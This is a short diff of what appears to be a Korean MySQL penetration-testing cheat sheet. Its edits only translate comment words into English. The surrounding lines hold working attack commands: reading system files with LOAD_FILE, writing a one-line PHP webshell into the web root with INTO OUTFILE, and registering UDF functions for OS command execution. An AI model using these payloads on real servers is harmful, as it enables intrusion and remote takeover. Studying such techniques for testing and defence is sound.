@@ -80,10 +80,10 @@ SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');
 SHOW VARIABLES LIKE 'secure_file_priv';
 -- 빈 값 = 제한 없음, NULL = 불가, 경로 = 해당 경로만 가능
 
--- 파일 쓰기 (웹쉘)
+-- 파일 쓰기 (webshell)
 SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 
--- DUMPFILE (바이너리 파일)
+-- DUMPFILE (binary 파일)
 SELECT 0x... INTO DUMPFILE '/var/www/html/shell.php';
 ```
 
@@ -91,10 +91,10 @@ SELECT 0x... INTO DUMPFILE '/var/www/html/shell.php';
 
 ```bash
 # MySQL이 root로 실행 중일 때 UDF를 통해 OS 명령 실행
-# 1. UDF 라이브러리 위치 확인
+# 1. UDF library 위치 확인
 SHOW VARIABLES LIKE 'plugin_dir';
 
-# 2. UDF 라이브러리 업로드 (lib_mysqludf_sys.so)
+# 2. UDF library upload (lib_mysqludf_sys.so)
 # 3. 함수 등록
 CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
 CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
